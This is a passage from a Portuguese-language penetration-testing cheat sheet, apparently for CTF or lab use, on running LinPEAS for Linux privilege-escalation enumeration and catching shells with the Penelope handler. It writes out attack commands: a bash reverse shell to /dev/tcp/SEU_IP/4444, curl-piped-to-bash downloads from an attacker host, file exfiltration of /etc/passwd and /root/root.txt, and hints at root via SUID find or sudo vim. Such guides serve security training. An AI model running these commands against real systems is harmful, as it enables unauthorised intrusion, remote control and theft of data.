> - 🔴 **Vermelho/Amarelo** → Alta chance de privesc
> - 🟡 **Amarelo** → Interessante, investigar
> - 🟢 **Verde** → Informação de contexto
>
> **GitHub:** https://github.com/peass-ng/PEASS-ng

### Download e Execução

```bash
# ─── OPÇÃO 1: Executar direto da memória (sem gravar no disco) ───
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# ─── OPÇÃO 2: Baixar e executar ───
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# ─── OPÇÃO 3: Transferir da sua máquina (quando não tem internet no alvo) ───
# Na sua máquina atacante:
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8080

# No alvo:
wget http://SEU_IP:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

### Flags Mais Úteis

```bash
# Execução completa com saída colorida (padrão)
./linpeas.sh

# Salvar output em arquivo para analisar depois (sem perder as cores)
./linpeas.sh | tee /tmp/linpeas_output.txt

# Salvar com cores em HTML para análise offline
./linpeas.sh -a > /tmp/output.txt    # -a = All checks (mais completo, mais lento)

# Executar apenas categorias específicas (mais rápido):
./linpeas.sh -s   # Super fast (verifica só o mais crítico)

# Passar senha para verificar acesso sudo:
./linpeas.sh -p SenhaAqui

# Especificar rede para scan interno:
./linpeas.sh -i 192.168.1.0/24
```

### O que o LinPEAS Verifica (principais categorias)

| Categoria | O que ele procura |
|---|---|
| **Sistema** | Versão do kernel, SO, arquitetura, hostname |
| **Usuários** | Usuários com shell, sudoers, grupos especiais |
| **Sudo** | `sudo -l`, misconfigs, GTFOBins |
| **SUID/SGID** | Todos os binários com SUID/SGID e comparação com lista conhecida |
| **Capabilities** | `getcap` em todo sistema |
| **Cronjobs** | `/etc/cron*`, crontabs de usuários, scripts do systemd |
| **Arquivos sensíveis** | `.bash_history`, `.env`, `config.php`, senhas em claro |
| **Chaves SSH** | Chaves privadas legíveis em qualquer home |
| **Containers** | Detecta Docker, LXC, namespaces |
| **Redes** | Portas abertas internamente, hosts acessíveis |
| **NFS** | Exports com `no_root_squash` |
| **Kernel Exploits** | Sugere CVEs baseado na versão do kernel |
| **Passwords** | Busca por strings de senha em arquivos de configuração |

### Workflow Recomendado com LinPEAS

```bash
# 1. Entrou na máquina? Primeiro, estabilize a shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color

# 2. Transfira e execute o LinPEAS:
wget http://SEU_IP:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh 2>/dev/null | tee /tmp/out.txt

# 3. Foque nos alertas VERMELHOS primeiro:
grep -E '(\033\[31m|99%)' /tmp/out.txt

# 4. Depois analise os AMARELOS:
grep -E '\033\[33m' /tmp/out.txt

# 5. Se encontrou algo (ex: SUID interessante), use GTFOBins:
# https://gtfobins.github.io/
```

### Interpretando o Output

```
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
[i] https://www.exploit-db.com/exploits/...       ← Link direto para exploit!

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#suid
-rwsr-xr-x 1 root root /usr/bin/find             ← SUID em find = CRÍTICO!

╔══════════╣ Sudo commands        
(root) NOPASSWD: /usr/bin/vim                     ← sudo vim sem senha = ROOT!
```

> **Dica:** O LinPEAS sempre coloca links do **HackTricks** e **GTFOBins** ao lado dos achados. Quando vir algo em vermelho, clique no link — ele já diz como explorar!

---

## 🐚 Penelope — Reverse Shell Handler (Recomendado após PrivEsc)

> **O que é:** Handler avançado de reverse shells em Python. Faz upgrade automático para TTY, suporta múltiplas sessões, download/upload e logging. **Substitui o netcat como listener** e é especialmente útil para gerenciar a shell obtida após privilege escalation.
> **GitHub:** https://github.com/brightio/penelope

### Instalação

```bash
# Clonar o repositório
git clone https://github.com/brightio/penelope.git
cd penelope

# Ou usar direto sem instalar (mais prático)
curl https://raw.githubusercontent.com/brightio/penelope/main/penelope.py -o penelope.py

# Ou instalar via pip
pip install penelope-shell
```

### Iniciar Listener (substitui `nc -lvnp`)

```bash
# Listener básico na porta 4444
python3 penelope.py 4444

# Listener em interface específica
python3 penelope.py 4444 -i 0.0.0.0
```

### Comandos Dentro da Penelope (após receber a shell)

| Comando | Função |
|---|---|
| `Ctrl+C` | **NÃO mata a sessão!** Vai para o menu de sessões |
| `Enter` | Voltar para a sessão ativa |
| `sessions` | Listar todas as sessões (múltiplas shells simultâneas) |
| `use 1` | Trocar para sessão número 1 |
| `download /etc/passwd` | Baixar arquivo do alvo para sua máquina |
| `upload linpeas.sh /tmp/` | Enviar arquivo da sua máquina para o alvo |
| `spawn` | Gerar um novo listener em outra porta |
| `upgrade` | Forçar upgrade da shell para PTY (geralmente automático) |
| `dir` | Mudar o diretório onde os downloads são salvos |
| `kill 1` | Encerrar a sessão número 1 |
| `exit` | Sair da Penelope |

### Gerar Payloads Automaticamente

```bash
# Penelope gera e mostra o payload pronto para copiar
python3 penelope.py 4444 -g

# Gerar payload para tipo de shell específico
python3 penelope.py 4444 -g bash
python3 penelope.py 4444 -g python
python3 penelope.py 4444 -g php
```

### Servir Arquivos Automaticamente (Transferir LinPEAS e outras ferramentas)

```bash
# Inicia listener E um servidor HTTP na porta 8080 ao mesmo tempo
python3 penelope.py 4444 -s

# No alvo, basta fazer:
wget http://SEU_IP:8080/linpeas.sh
# Ou:
curl http://SEU_IP:8080/linpeas.sh | bash
```

### Por que Usar Penelope em vez de Netcat

- ✅ Shell **interativa completa** automaticamente (sem o ritual do `pty.spawn`)
- ✅ **Setas** e **histórico** de comandos nativos
- ✅ **Tab completion** funciona
- ✅ **Ctrl+C** não derruba a sessão (diferente do netcat!)
- ✅ **Múltiplas shells** simultâneas (alterne com `Ctrl+C` → `use N`)
- ✅ **Download/Upload** integrado (sem precisar abrir outro servidor)
- ✅ **Auto-resize** do terminal (sem `stty rows/cols` manual)
- ✅ **Logging** automático de toda a sessão
- ✅ **Servidor HTTP embutido** para transferir ferramentas (`-s` flag)

### Fluxo Completo: Penelope + LinPEAS

```bash
# ─── Na sua máquina atacante ───
# 1. Iniciar Penelope com servidor HTTP embutido
python3 penelope.py 4444 -s
# → Isso abre listener na 4444 E servidor HTTP na 8080

# ─── No alvo (após conseguir RCE inicial) ───
# 2. Enviar payload de reverse shell (qualquer tipo)
bash -i >& /dev/tcp/SEU_IP/4444 0>&1

# ─── Na Penelope (após receber a conexão) ───
# 3. Shell já vem estabilizada automaticamente!
# 4. Enviar o LinPEAS diretamente via HTTP interno:
wget http://SEU_IP:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

# 5. Após encontrar vetor de privesc, explorar e virar root
# 6. Baixar evidências:
download /root/root.txt
```
